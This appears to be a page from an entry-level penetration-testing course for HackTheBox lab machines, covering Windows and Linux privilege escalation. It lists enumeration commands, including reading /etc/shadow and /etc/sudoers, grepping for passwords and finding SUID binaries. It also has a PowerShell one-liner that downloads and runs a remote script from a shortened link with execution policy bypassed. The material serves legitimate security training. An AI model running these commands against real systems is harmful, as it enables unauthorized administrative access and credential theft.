---
description: How to escalate your privileges to gain administrative access on a system
---

# Part 4 - Privilege escalation

## What do you learn in this part?

* Privilege escalation
  * Windows
  * Linux

**Boxes that are suitable for this part**

* Nibbles 10.10.10.75
* Celestial 10.10.10.85
* Jerry 10.10.10.95

## **Privilege escalation**

> Everybody wants to be a hacker, but nobody wants to read no damn man page - Chris

### The goal

* Linux -&gt; Becoming root, id 0
* Windows -&gt; Becoming NT AUTHORITY\SYSTEM or Administrator

What does it mean? Very often on Hackthebox and in real pentests we end up getting access to a system as a regular user or service account. This access always has a certain level of privilege on the system you are on. Most regular users are low privileged, that means they can't perform adminsitrative tasks, e.g. disable the antivirus, install new software or open ports. Our goal is to get the highest level of privilege possible. In Windows that is called Administrative privilege and in Linux its called root or super user privilege.

## **Windows privilege escalation**

### Credential reuse

Sometimes a user that you have the credentials for is also thean administrator on the system, but uses the same password for both accounts. So never forget to try passwords when you have the chance. Just don't overdo it so you trigger some lockout mechanism and get detected.

Try the obvious - Maybe the user is SYSTEM or is already part of the Administrator group. As you can see from the output of the three commands below the username is _hacker_, he is part of the group _administrators._ In this case, a privilege escalation is not necessary because we are already in the administrators group!

* `whoami`
* `net localgroup administrator`
* `net user "%username%"`

![](.gitbook/assets/image%20%2810%29.png)

### Kernel exploits

Metasploit exploit suggester can be used to find kernel exploits in Windows. That means exploits that allow for local privilege escalation from user and service accounts to administrator or SYSTEM.  We don't cover it here as it was thoroughly covered in [Part 1 - How to hack ](part-1-how-to-hack.md#4-privilege-escalation)[\#Privilege Escalation](part-1-how-to-hack.md#4-privilege-escalation)

Run `systeminfo` or `sysinfo` to get some information about the OS installed hotfixes. If no hotfixes installed, few or no patches are installed, which means it is probably vulnerable to kernel vulnerabilites. Hence, privilege escalation using kernel exploits could be possible.

### PowerUp

PowerUp is an extremely useful script for quickly checking for obvious paths to privilege escalation on Windows. It is not an exploit itself, but it can reveal vulnerabilities such as administrator password stored in registry and similar. We shamelessly use [harmj0y's guide](https://www.harmj0y.net/blog/powershell/powerup-a-usage-guide/) as reference point for the following guide. Some basic knowledge about how to import Powershell modules and used them is required.

Import the PowerUp module with the following:

`PS C:\>` **`Import-Module PowerUp.ps1`**

If you want to invoke everything without touching disk, use something like this:

`C:\> powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/1mK64oH’); Invoke-AllChecks”`



### Finding stuff fast

`findstr /s /C:"stringtosearchfor.txt" "C:*"`

### Service account escalation \(potato\)

There are several known techniques to escalate from service accounts to SYSTEM. The details of this exploit are slightly out of scope for what's supposed to be an entry level guide to hacking, but we chose to include it because it has saved us numerous times and because @decoder does such a good job with it. [https://decoder.cloud/2017/12/23/the-lonely-potato/](https://decoder.cloud/2017/12/23/the-lonely-potato/)

## **Linux privilge escalation**

### Sudo

What is sudo? 

`sudo` is a command you will probably see a lot in the Linux world. It allows regular users to perform certain tasks as root user. This is useful for performing administrative tasks without switching to the root user all th etime. It requires that the user has been added to the sudoers group. Of course we should abuse this. Try `sudo -l` to find the commands the user you currently can run as sudo.

### Linux permissions

In Linux, everything is a file All files have owners and access permissions We use that to our advantage

`ls -l Desktop/`

`-rwxr-xr-x 2 chris meme.jpg 4096 Dec 1 11:45 .`

This permissions indication is grouped into three categories: owner, group, world in that order. For each of those three a read, write and execute permission is set. Owner simply means the owner of the file, group means access to the file through being member of the appropriate group and world simply means any user on the system.

`| rwx | r-x | x`

Changing permissions to writable for the owner.

`chmod +w script.sh`

### Confidential information and users

 `id`

`su`

`sudo -l`

`cat /etc/passwd`

`cat /etc/shadow`

`cat /etc/group`

`cat /etc/sudoers`

`ls -alh /var/mail/`

`ls -ahlR /root`

 `ls -ahlR /home/`

### Cron jobs - scheduled jobs that run every min/hour/day 

`ls -al /etc/cron` 

`cat /etc/cron` 

`crontab -l`

If root runs a backup every other minute, what can we do? If it is a file or directory, we can hijack it if we have write permissions

### World writable files and folders

`find / -xdev -type d ( -perm -0002 -a ! -perm -1000 ) -print`

`find / -writable -type d 2>/dev/null`

#### Generally interesting directories

`ls -la /*`

`ls -la /var/log`

`ls -la /var/mail`

`ls -la /var/www/`

`ls -la /opt`

### Find interesting files and directories fast

`find / -name "*.txt" 2> >(grep -v 'Permission denied' >&2)`

`grep -R -i "password" 2> >(grep -v 'Permission denied' >&2)`

### SUID files / binaries

The file will run as the owner no matter who executes it. So if root owns it, we can run it and hijack it to become root 

`find / -perm -u=s -type f 2>/dev/null`

### Look for Linux kernel exploits

First find what kernel and distro you are running. Then use searchsploit to identify whether there are any exploits available for privilege escalation

`uname -a  
cat /etc/*-release  
cat /etc/issue`  
`searchsploit kernel`

Here you can see how we can find local privilege escalation exploits from Exploit-DB. If you look in the path on the right hand pane you can see some of them have "local" in the path, which means they are local privilege escalation exploits, which are those we want. Those that have "dos" in the path are for denial of service attacks, which won't be relevant. Note that kernel exploits are prone to crashing the operating system, so be very careful with running these. Make attempts to exhaust other alternatives before turning to kernel exploits. 

![](.gitbook/assets/image%20%2813%29.png)

### Check running services and installed applications

`ps -ef cat /etc/services  
dpkg -l rpm -qa`

An example here is for instance that you see a local database like mysql is running. Maybe you are able to find credentials for it and log into it locally on the box.

